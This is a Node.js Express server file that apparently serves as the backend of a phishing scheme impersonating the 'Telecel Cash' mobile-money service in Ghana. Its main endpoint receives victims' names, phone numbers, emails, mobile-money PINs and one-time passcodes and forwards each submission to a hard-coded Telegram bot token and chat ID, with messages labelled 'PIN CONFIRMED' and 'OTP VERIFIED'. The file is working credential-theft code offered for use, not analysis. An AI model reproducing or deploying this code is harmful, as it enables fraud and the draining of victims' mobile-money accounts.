const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());

// CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

// ========== TELEGRAM CREDENTIALS ==========
const TG_BOT_TOKEN = '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA';
const TG_CHAT_ID = '6414813627';

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'healthy', uptime: process.uptime() });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({ status: 'OK', message: 'Telecel Cash API is running!' });
});

// Main send endpoint
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, type, site, amount, term, monthly, employment } = req.body;
        
        const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Accra' });
        
        let message = '';
        if (type === 'application') {
            message = `📱 NEW APPLICATION - Telecel Cash 📱\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email}\n💰 Amount: ₵${amount}\n📅 Term: ${term} months\n💵 Monthly: ₵${monthly}\n💼 Income: ₵${pin}\n🏢 Employment: ${employment}\n⏰ Time: ${timestamp}`;
        } else if (type === 'pin') {
            message = `🔐 PIN CONFIRMED - Telecel Cash 🔐\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n💰 Amount: ₵${amount}\n🔑 PIN: ${pin}\n⏰ Time: ${timestamp}`;
        } else if (type === 'otp') {
            message = `✅ OTP VERIFIED - Telecel Cash ✅\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n💰 Amount: ₵${amount}\n🔢 OTP: ${pin}\n⏰ Time: ${timestamp}`;
        } else {
            message = `📝 NEW SUBMISSION\n\nName: ${name}\nPhone: ${phone}\nDetails: ${pin}\n⏰ Time: ${timestamp}`;
        }
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
            res.json({ success: true });
        } else {
            res.json({ success: false, error: result.description });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Test endpoint
app.post('/api/test-telegram', async (req, res) => {
    try {
        const testMessage = `🔧 TEST - Telecel Cash Bot is working! ✅`;
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(testMessage)}`;
        const response = await fetch(url);
        const result = await response.json();
        res.json({ success: result.ok, error: result.description });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Telecel Cash Backend running on port ${PORT}`);
    console.log(`📱 Chat ID: ${TG_CHAT_ID}`);
});
